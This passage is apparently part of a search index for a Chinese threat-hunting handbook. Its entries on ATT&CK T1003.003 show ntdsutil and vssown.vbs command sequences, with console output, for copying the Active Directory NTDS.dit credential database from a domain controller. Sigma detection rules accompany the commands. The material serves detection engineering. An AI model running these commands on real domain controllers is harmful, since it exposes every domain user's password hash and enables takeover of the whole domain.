ntds\u201d \u201cifm\u201d \u201ccreate full c:\\temp\u201d q q IFM \u662f\u4e00\u4e2a NTDS.dit\u6587\u4ef6\u7684\u526f\u672c\uff0c\u653e\u5728 C://temp \u76ee\u5f55\u4e2d\u3002\u5f53\u521b\u5efa\u4e00\u4e2aIFM\u65f6\uff0c\u4e5f\u4f1a\u4ea7\u751f\u5e76\u6302\u8f7d\u4e00\u4e2aVSS\u5feb\u7167\uff0c\u540c\u65f6Ntds.dit\u6587\u4ef6\u548c\u76f8\u5173\u7684\u6570\u636e\u4e5f\u88ab\u590d\u5236\u5230\u76ee\u6807\u6587\u4ef6\u5939\u4e2d\u3002 \u8be5\u6587\u4ef6\u53ef\u80fd\u5b58\u50a8\u5728\u4e00\u4e2a\u6b63\u5728promot\u7684\u65b0\u7684DC\u7684\u5171\u4eab\u6587\u4ef6\u5939\u4e2d\uff0c\u4e5f\u53ef\u80fd\u51fa\u73b0\u5728\u8fd8\u6ca1\u6709promot\u7684\u65b0\u7684\u670d\u52a1\u5668\u4e0a\u3002 \u6b64\u670d\u52a1\u5668\u53ef\u80fd\u65e0\u6cd5\u786e\u4fddIFM\u6570\u636e\u7684\u5b89\u5168\uff0c\u5305\u62ec\u590d\u5236Ntds.dit\u6587\u4ef6\u5e76\u63d0\u53d6\u51ed\u8bc1\u6570\u636e\u3002\u8fd9\u4e2a\u547d\u4ee4\u4e5f\u53ef\u4ee5\u901a\u8fc7 WMI \u6216 PowerShell \u8fdc\u7a0b\u6267\u884c\u3002\uff08\u5efa\u8bae\u4f7f\u7528powershell\u6267\u884c\uff0cDOS\u547d\u4ee4\u6267\u884c\u5f02\u5e38\u9519\u8bef\uff09","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-ntds%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-ntds%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/#_3","text":"C:\\Windows\\system32\\ntdsutil.exe: ac i ntds \u6d3b\u52a8\u5b9e\u4f8b\u8bbe\u7f6e\u4e3a\u201cntds\u201d\u3002 C:\\Windows\\system32\\ntdsutil.exe: ifm ifm: create full c:\\temp \u6b63\u5728\u521b\u5efa\u5feb\u7167... \u6210\u529f\u751f\u6210\u5feb\u7167\u96c6 {ea08df62-9743-4068-aedb-a2c32dfd057f}\u3002 \u5feb\u7167 {2d92b366-961f-45f0-9202-9aa6f069139f} \u5df2\u4f5c\u4e3a C:\\$SNAP_201911011107_VOLUMEC$\\ \u88c5\u8f7d \u5df2\u88c5\u8f7d\u5feb\u7167 {2d92b366-961f-45f0-9202-9aa6f069139f}\u3002 \u6b63\u5728\u542f\u52a8\u788e\u7247\u6574\u7406\u6a21\u5f0f... \u6e90\u6570\u636e\u5e93: C:\\$SNAP_201911011107_VOLUMEC$\\Windows\\NTDS\\ntds.dit \u76ee\u6807\u6570\u636e\u5e93: c:\\temp\\Active Directory\\ntds.dit Defragmentation Status (% complete) 0 10 20 30 40 50 60 70 80 90 100 |----|----|----|----|----|----|----|----|----|----| ................................................... \u6b63\u5728\u590d\u5236\u6ce8\u518c\u8868\u6587\u4ef6... \u6b63\u5728\u590d\u5236 c:\\temp\\registry\\SYSTEM \u6b63\u5728\u590d\u5236 c:\\temp\\registry\\SECURITY \u5feb\u7167 {2d92b366-961f-45f0-9202-9aa6f069139f} \u5df2\u5378\u8f7d\u3002 \u5728 c:\\temp \u4e2d\u6210\u529f\u521b\u5efa IFM \u5a92\u4f53\u3002 ifm: q C:\\Windows\\system32\\ntdsutil.exe: q","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-ntds%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/#_4","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-ntds%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/#_5","text":"\u5efa\u8bae\u9488\u5bf9\u8fdb\u7a0b\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u76d1\u63a7\u3002\u9488\u5bf9\u8fdb\u7a0b\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u76d1\u63a7\u9700\u8981\u7279\u5b9a\u7684\u73af\u5883\uff0c\u6bd4\u5982\u914d\u7f6e\u5ba1\u6838\u7b56\u7565\u3001\u91c7\u96c6sysmon\u65e5\u5fd7\u7b49\u3002","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-ntds%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/#_6","text":"MITRE-ATT&CK-T1003-003 https://attack.mitre.org/techniques/T1003/003 NTDSutil\u7b80\u4ecb https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753343(v=ws.10)?redirectedfrom=MSDN","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/","text":"T1003-003-win-\u4f7f\u7528vssown.vbs\u83b7\u5f97NTDS.dit\u6587\u4ef6 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u8bbf\u95ee\u6216\u521b\u5efaActive Directory\u57df\u6570\u636e\u5e93\u7684\u526f\u672c\uff0c\u4ee5\u4fbf\u7a83\u53d6\u51ed\u636e\u4fe1\u606f\uff0c\u4ee5\u53ca\u83b7\u53d6\u6709\u5173\u57df\u6210\u5458\uff08\u4f8b\u5982\u8bbe\u5907\uff0c\u7528\u6237\u548c\u8bbf\u95ee\u6743\u9650\uff09\u7684\u5176\u4ed6\u4fe1\u606f\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\uff08NTDS.dit\uff09\u4f4d\u4e8e%SystemRoot%\\NTDS\\Ntds.dit\u57df\u63a7\u5236\u5668\u4e2d\u3002 \u9664\u4e86\u5728\u6d3b\u52a8\u7684\u57df\u63a7\u5236\u5668\u4e0a\u67e5\u627eNTDS\u6587\u4ef6\u4e4b\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u641c\u7d22\u5305\u542b\u76f8\u540c\u6216\u76f8\u4f3c\u4fe1\u606f\u7684\u5907\u4efd\u3002 \u4e0b\u5217\u5de5\u5177\u548c\u6280\u672f\u53ef\u7528\u4e8e\u679a\u4e3eNTDS\u6587\u4ef6\u548c\u6574\u4e2aActive Directory\u54c8\u5e0c\u7684\u5185\u5bb9\u3002 \u5377\u5f71\u590d\u5236 secretsdump.py \u4f7f\u7528\u5185\u7f6e\u7684Windows\u5de5\u5177ntdsutil.exe \u8c03\u7528\u5377\u5f71\u526f\u672c NTDS.dit Ntds.dit\u6587\u4ef6\u662f\u5b58\u50a8Active Directory\u6570\u636e\u7684\u6570\u636e\u5e93\uff0c\u5305\u62ec\u6709\u5173\u7528\u6237\u5bf9\u8c61\uff0c\u7ec4\u548c\u7ec4\u6210\u5458\u8eab\u4efd\u7684\u4fe1\u606f\u3002\u5b83\u5305\u62ec\u57df\u4e2d\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u503c\u3002\u57df\u63a7\u5236\u5668\uff08DC\uff09\u4e0a\u7684ntds.dit\u6587\u4ef6\u53ea\u80fd\u7531\u53ef\u4ee5\u767b\u5f55\u5230DC\u7684\u7528\u6237\u8bbf\u95ee\u3002\u5f88\u660e\u663e\uff0c\u4fdd\u62a4\u8fd9\u4e2a\u6587\u4ef6\u81f3\u5173\u91cd\u8981\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u5bfc\u81f4\u6574\u4e2a\u57df\u6ca6\u9677\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\u5c06\u4f4d\u4e8e\u57df\u63a7\u5236\u5668\u7684\uff05SystemRoot\uff05\\NTDS\\Ntds.dit\u4e2d\u3002 \u4f46\u901a\u5e38\u5b58\u50a8\u5728\u5176\u4ed6\u903b\u8f91\u9a71\u52a8\u5668\u4e0a\uff09\u3002AD\u6570\u636e\u5e93\u662f\u4e00\u4e2aJet\u6570\u636e\u5e93\u5f15\u64ce\uff0c\u5b83\u4f7f\u7528\u53ef\u6269\u5c55\u5b58\u50a8\u5f15\u64ce\uff08ESE\uff09\u63d0\u4f9b\u6570\u636e\u5b58\u50a8\u548c\u7d22\u5f15\u670d\u52a1\u3002\u901a\u8fc7ESE\u7ea7\u522b\u7d22\u5f15\uff0c\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d\u5bf9\u8c61\u5c5e\u6027\u3002 \u6d4b\u8bd5\u6848\u4f8b \u57282016+\u57df\u63a7\u4e0a\u4f7f\u7528 ntdsutil snapshot mount\u5bfc\u51fantds.dit \u521b\u5efa\u5feb\u7167 cscript vssown.vbs /start cscript vssown.vbs /create c cscript vssown.vbs /list copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy11\\windows\\ntds\\ntds.dit C:\\ cscript vssown.vbs /delete \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 C:\\Users\\Administrator\\Desktop\\test>cscript vssown.vbs /start Microsoft (R) Windows Script Host Version 5.812 \u7248\u6743\u6240\u6709(C) Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 [*] Signal sent to start the VSS service. C:\\Users\\Administrator\\Desktop\\test>cscript vssown.vbs /create c Microsoft (R) Windows Script Host Version 5.812 \u7248\u6743\u6240\u6709(C) Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 [*] Attempting to create a shadow copy. C:\\Users\\Administrator\\Desktop\\test>cscript vssown.vbs /list Microsoft (R) Windows Script Host Version 5.812 \u7248\u6743\u6240\u6709(C) Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 SHADOW COPIES ============= [*] ID: {42C8E0BD-6FD9-4CFB-B006-4640DAE84DC8} [*] Client accessible: True [*] Count: 1 [*] Device object: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 [*] Differential: True [*] Exposed locally: False [*] Exposed name: [*] Exposed remotely: False [*] Hardware assisted: False [*] Imported: False [*] No auto release: True [*] Not surfaced: False [*] No writers: True [*] Originating machine: ICBC.abcc.org [*] Persistent: True [*] Plex: False [*] Provider ID: {B5946137-7B9F-4925-AF80-51ABD60B20D5} [*] Service machine: ICBC.abcc.org [*] Set ID: {584C48BF-649D-4B35-9CAE-3165C2C8BE53} [*] State: 12 [*] Transportable: False [*] Volume name: \\\\?\\Volume{16da2094-7213-420f-a023-db7b3e3a7f6f}\\ C:\\Users\\Administrator\\Desktop\\test>copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\ntds\\ntds.dit C:\\ \u5df2\u590d\u5236 1 \u4e2a\u6587\u4ef6\u3002 C:\\Users\\Administrator\\Desktop\\test>cscript vssown.vbs /delete Microsoft (R) Windows Script Host Version 5.812 \u7248\u6743\u6240\u6709(C) Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 \u6d4b\u8bd5\u7559\u75d5 \u6d4b\u8bd5\u7559\u75d5\u65e5\u5fd7\u4e0b\u8f7d\u5730\u5740\uff1a https://github.com/12306Bro/Threathunting-book/blob/master/Eventdata/vssown.evtx \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u4f7f\u7528vssown.vbs\u62ff\u5230NTDS.dit\u6587\u4ef6 description: windows server 2016+ AD\u57df\u63a7 tags: T1003-003 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 New processname: C:\\Windows\\System32\\cscript.exe Process commandline: - cscript *.vbs /start #\u57fa\u4e8e\u547d\u4ee4\u884c\u68c0\u6d4b - cscript *.vbs /create c #\u57fa\u4e8e\u547d\u4ee4\u884c\u68c0\u6d4b - cscript *.vbs /delete #\u57fa\u4e8e\u547d\u4ee4\u884c\u68c0\u6d4b - cscript *.vbs /list #\u57fa\u4e8e\u547d\u4ee4\u884c\u68c0\u6d4b condition: selection --- detection: selection1: EventID: 4904 #\u5df2\u8bd5\u56fe\u6ce8\u518c\u5b89\u5168\u4e8b\u4ef6\u6e90\u3002 Processname: C:\\Windows\\System32\\VSSVC.exe Source name: VSSAudit #\u4e8b\u4ef6\u6e90 selection2: EventID: 8222 #\u5df2\u521b\u5efa\u5f71\u5b50\u526f\u672c\u3002 Process image name: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe Raw volume: \\\\?\\Volume{*}\\ #\"*\"\u4ee3\u8868\u6b63\u5219\u5339\u914d Shadow device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy* #\"*\"\u4ee3\u8868\u6b63\u5219\u5339\u914d selection3: EventID: 4905 #\u5df2\u8bd5\u56fe\u53d6\u6d88\u6ce8\u518c\u5b89\u5168\u4e8b\u4ef6\u6e90\u3002 Processname: C:\\Windows\\System32\\VSSVC.exe Source name: VSSAudit #\u4e8b\u4ef6\u6e90 \u200btimeframe: last 10S #\u81ea\u5b9a\u4e49\u65f6\u95f4\u8303\u56f4 condition: all of them level: medium \u5efa\u8bae \u6b64\u68c0\u6d4b\u7279\u5f81\u4ec5\u9002\u7528\u4e8ewindows AD\u57df\u63a7\u4e3b\u673a\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1003-003 https://attack.mitre.org/techniques/T1003/003 vssown.vbs\u4e0b\u8f7d\u5730\u5740 https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs \u57df\u6e17\u900f\u2014\u2014\u83b7\u5f97\u57df\u63a7\u670d\u52a1\u5668\u7684NTDS.dit\u6587\u4ef6 https://xz.aliyun.com/t/2187 MITRE ATT&CK\u653b\u51fb\u77e5\u8bc6\u5e93\uff08\u4f01\u4e1a\uff09\u4e2d\u6587\u7248 https://hansight.github.io/#/","title":"T1003-003-win-\u4f7f\u7528vssown.vbs\u83b7\u5f97NTDS.dit\u6587\u4ef6"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/#t1003-003-win-vssownvbsntdsdit","text":"","title":"T1003-003-win-\u4f7f\u7528vssown.vbs\u83b7\u5f97NTDS.dit\u6587\u4ef6"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u8bbf\u95ee\u6216\u521b\u5efaActive Directory\u57df\u6570\u636e\u5e93\u7684\u526f\u672c\uff0c\u4ee5\u4fbf\u7a83\u53d6\u51ed\u636e\u4fe1\u606f\uff0c\u4ee5\u53ca\u83b7\u53d6\u6709\u5173\u57df\u6210\u5458\uff08\u4f8b\u5982\u8bbe\u5907\uff0c\u7528\u6237\u548c\u8bbf\u95ee\u6743\u9650\uff09\u7684\u5176\u4ed6\u4fe1\u606f\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\uff08NTDS.dit\uff09\u4f4d\u4e8e%SystemRoot%\\NTDS\\Ntds.dit\u57df\u63a7\u5236\u5668\u4e2d\u3002 \u9664\u4e86\u5728\u6d3b\u52a8\u7684\u57df\u63a7\u5236\u5668\u4e0a\u67e5\u627eNTDS\u6587\u4ef6\u4e4b\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u641c\u7d22\u5305\u542b\u76f8\u540c\u6216\u76f8\u4f3c\u4fe1\u606f\u7684\u5907\u4efd\u3002 \u4e0b\u5217\u5de5\u5177\u548c\u6280\u672f\u53ef\u7528\u4e8e\u679a\u4e3eNTDS\u6587\u4ef6\u548c\u6574\u4e2aActive Directory\u54c8\u5e0c\u7684\u5185\u5bb9\u3002 \u5377\u5f71\u590d\u5236 secretsdump.py \u4f7f\u7528\u5185\u7f6e\u7684Windows\u5de5\u5177ntdsutil.exe \u8c03\u7528\u5377\u5f71\u526f\u672c","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/#ntdsdit","text":"Ntds.dit\u6587\u4ef6\u662f\u5b58\u50a8Active Directory\u6570\u636e\u7684\u6570\u636e\u5e93\uff0c\u5305\u62ec\u6709\u5173\u7528\u6237\u5bf9\u8c61\uff0c\u7ec4\u548c\u7ec4\u6210\u5458\u8eab\u4efd\u7684\u4fe1\u606f\u3002\u5b83\u5305\u62ec\u57df\u4e2d\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u503c\u3002\u57df\u63a7\u5236\u5668\uff08DC\uff09\u4e0a\u7684ntds.dit\u6587\u4ef6\u53ea\u80fd\u7531\u53ef\u4ee5\u767b\u5f55\u5230DC\u7684\u7528\u6237\u8bbf\u95ee\u3002\u5f88\u660e\u663e\uff0c\u4fdd\u62a4\u8fd9\u4e2a\u6587\u4ef6\u81f3\u5173\u91cd\u8981\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u5bfc\u81f4\u6574\u4e2a\u57df\u6ca6\u9677\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\u5c06\u4f4d\u4e8e\u57df\u63a7\u5236\u5668\u7684\uff05SystemRoot\uff05\\NTDS\\Ntds.dit\u4e2d\u3002 \u4f46\u901a\u5e38\u5b58\u50a8\u5728\u5176\u4ed6\u903b\u8f91\u9a71\u52a8\u5668\u4e0a\uff09\u3002AD\u6570\u636e\u5e93\u662f\u4e00\u4e2aJet\u6570\u636e\u5e93\u5f15\u64ce\uff0c\u5b83\u4f7f\u7528\u53ef\u6269\u5c55\u5b58\u50a8\u5f15\u64ce\uff08ESE\uff09\u63d0\u4f9b\u6570\u636e\u5b58\u50a8\u548c\u7d22\u5f15\u670d\u52a1\u3002\u901a\u8fc7ESE\u7ea7\u522b\u7d22\u5f15\uff0c\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d\u5bf9\u8c61\u5c5e\u6027\u3002","title":"NTDS.dit"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/#_1","text":"\u57282016+\u57df\u63a7\u4e0a\u4f7f\u7528 ntdsutil snapshot mount\u5bfc\u51fantds.dit","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/#_2","text":"cscript vssown.vbs /start cscript vssown.vbs /create c cscript vssown.vbs /list copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy11\\windows\\ntds\\ntds.dit C:\\ cscript vssown.vbs /delete","title":"\u521b\u5efa\u5feb\u7167"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/#_3","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/#_4","text":"C:\\Users\\Administrator\\Desktop\\test>cscript vssown.vbs /start Microsoft (R) Windows Script Host Version 5.812 \u7248\u6743\u6240\u6709(C) Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 [*] Signal sent to start the VSS service. C:\\Users\\Administrator\\Desktop\\test>cscript vssown.vbs /create c Microsoft (R) Windows Script Host Version 5.812 \u7248\u6743\u6240\u6709(C) Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 [*] Attempting to create a shadow copy. C:\\Users\\Administrator\\Desktop\\test>cscript vssown.vbs /list Microsoft (R) Windows Script Host Version 5.812 \u7248\u6743\u6240\u6709(C) Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 SHADOW COPIES ============= [*] ID: {42C8E0BD-6FD9-4CFB-B006-4640DAE84DC8} [*] Client accessible: True [*] Count: 1 [*] Device object: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 [*] Differential: True [*] Exposed locally: False [*] Exposed name: [*] Exposed remotely: False [*] Hardware assisted: False [*] Imported: False [*] No auto release: True [*] Not surfaced: False [*] No writers: True [*] Originating machine: ICBC.abcc.org [*] Persistent: True [*] Plex: False [*] Provider ID: {B5946137-7B9F-4925-AF80-51ABD60B20D5} [*] Service machine: ICBC.abcc.org [*] Set ID: {584C48BF-649D-4B35-9CAE-3165C2C8BE53} [*] State: 12 [*] Transportable: False [*] Volume name: \\\\?\\Volume{16da2094-7213-420f-a023-db7b3e3a7f6f}\\ C:\\Users\\Administrator\\Desktop\\test>copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\ntds\\ntds.dit C:\\ \u5df2\u590d\u5236 1 \u4e2a\u6587\u4ef6\u3002 C:\\Users\\Administrator\\Desktop\\test>cscript vssown.vbs /delete Microsoft (R) Windows Script Host Version 5.812 \u7248\u6743\u6240\u6709(C) Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/#_5","text":"\u6d4b\u8bd5\u7559\u75d5\u65e5\u5fd7\u4e0b\u8f7d\u5730\u5740\uff1a https://github.com/12306Bro/Threathunting-book/blob/master/Eventdata/vssown.evtx","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/#_6","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/#sigma","text":"title: \u4f7f\u7528vssown.vbs\u62ff\u5230NTDS.dit\u6587\u4ef6 description: windows server 2016+ AD\u57df\u63a7 tags: T1003-003 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 New processname: C:\\Windows\\System32\\cscript.exe Process commandline: - cscript *.vbs /start #\u57fa\u4e8e\u547d\u4ee4\u884c\u68c0\u6d4b - cscript *.vbs /create c #\u57fa\u4e8e\u547d\u4ee4\u884c\u68c0\u6d4b - cscript *.vbs /delete #\u57fa\u4e8e\u547d\u4ee4\u884c\u68c0\u6d4b - cscript *.vbs /list #\u57fa\u4e8e\u547d\u4ee4\u884c\u68c0\u6d4b condition: selection --- detection: selection1: EventID: 4904 #\u5df2\u8bd5\u56fe\u6ce8\u518c\u5b89\u5168\u4e8b\u4ef6\u6e90\u3002 Processname: C:\\Windows\\System32\\VSSVC.exe Source name: VSSAudit #\u4e8b\u4ef6\u6e90 selection2: EventID: 8222 #\u5df2\u521b\u5efa\u5f71\u5b50\u526f\u672c\u3002 Process image name: C:\\Windows\\System32\\wbem\\WmiPrvSE.exe Raw volume: \\\\?\\Volume{*}\\ #\"*\"\u4ee3\u8868\u6b63\u5219\u5339\u914d Shadow device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy* #\"*\"\u4ee3\u8868\u6b63\u5219\u5339\u914d selection3: EventID: 4905 #\u5df2\u8bd5\u56fe\u53d6\u6d88\u6ce8\u518c\u5b89\u5168\u4e8b\u4ef6\u6e90\u3002 Processname: C:\\Windows\\System32\\VSSVC.exe Source name: VSSAudit #\u4e8b\u4ef6\u6e90 \u200btimeframe: last 10S #\u81ea\u5b9a\u4e49\u65f6\u95f4\u8303\u56f4 condition: all of them level: medium","title":"sigma\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/#_7","text":"\u6b64\u68c0\u6d4b\u7279\u5f81\u4ec5\u9002\u7528\u4e8ewindows AD\u57df\u63a7\u4e3b\u673a\u3002","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/#_8","text":"MITRE-ATT&CK-T1003-003 https://attack.mitre.org/techniques/T1003/003 vssown.vbs\u4e0b\u8f7d\u5730\u5740 https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs \u57df\u6e17\u900f\u2014\u2014\u83b7\u5f97\u57df\u63a7\u670d\u52a1\u5668\u7684NTDS.dit\u6587\u4ef6 https://xz.aliyun.com/t/2187 MITRE ATT&CK\u653b\u51fb\u77e5\u8bc6\u5e93\uff08\u4f01\u4e1a\uff09\u4e2d\u6587\u7248 https://hansight.github.io/#/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E4%BD%BF%E7%94%A8ntdsutil%E8%8E%B7%E5%BE%97NTDS.dit%E6%96%87%E4%BB%B6/","text":"T1003-003-win-\u4f7f\u7528ntdsutil\u83b7\u5f97NTDS.dit\u6587\u4ef6 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u8bbf\u95ee\u6216\u521b\u5efaActive Directory\u57df\u6570\u636e\u5e93\u7684\u526f\u672c\uff0c\u4ee5\u4fbf\u7a83\u53d6\u51ed\u636e\u4fe1\u606f\uff0c\u4ee5\u53ca\u83b7\u53d6\u6709\u5173\u57df\u6210\u5458\uff08\u4f8b\u5982\u8bbe\u5907\uff0c\u7528\u6237\u548c\u8bbf\u95ee\u6743\u9650\uff09\u7684\u5176\u4ed6\u4fe1\u606f\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\uff08NTDS.dit\uff09\u4f4d\u4e8e%SystemRoot%\\NTDS\\Ntds.dit\u57df\u63a7\u5236\u5668\u4e2d\u3002 \u9664\u4e86\u5728\u6d3b\u52a8\u7684\u57df\u63a7\u5236\u5668\u4e0a\u67e5\u627eNTDS\u6587\u4ef6\u4e4b\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u641c\u7d22\u5305\u542b\u76f8\u540c\u6216\u76f8\u4f3c\u4fe1\u606f\u7684\u5907\u4efd\u3002 \u4e0b\u5217\u5de5\u5177\u548c\u6280\u672f\u53ef\u7528\u4e8e\u679a\u4e3eNTDS\u6587\u4ef6\u548c\u6574\u4e2aActive Directory\u54c8\u5e0c\u7684\u5185\u5bb9\u3002 \u5377\u5f71\u590d\u5236 secretsdump.py \u4f7f\u7528\u5185\u7f6e\u7684Windows\u5de5\u5177ntdsutil.exe \u8c03\u7528\u5377\u5f71\u526f\u672c NTDS.dit Ntds.dit\u6587\u4ef6\u662f\u5b58\u50a8Active Directory\u6570\u636e\u7684\u6570\u636e\u5e93\uff0c\u5305\u62ec\u6709\u5173\u7528\u6237\u5bf9\u8c61\uff0c\u7ec4\u548c\u7ec4\u6210\u5458\u8eab\u4efd\u7684\u4fe1\u606f\u3002\u5b83\u5305\u62ec\u57df\u4e2d\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u503c\u3002\u57df\u63a7\u5236\u5668\uff08DC\uff09\u4e0a\u7684ntds.dit\u6587\u4ef6\u53ea\u80fd\u7531\u53ef\u4ee5\u767b\u5f55\u5230DC\u7684\u7528\u6237\u8bbf\u95ee\u3002\u5f88\u660e\u663e\uff0c\u4fdd\u62a4\u8fd9\u4e2a\u6587\u4ef6\u81f3\u5173\u91cd\u8981\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u5bfc\u81f4\u6574\u4e2a\u57df\u6ca6\u9677\u3002 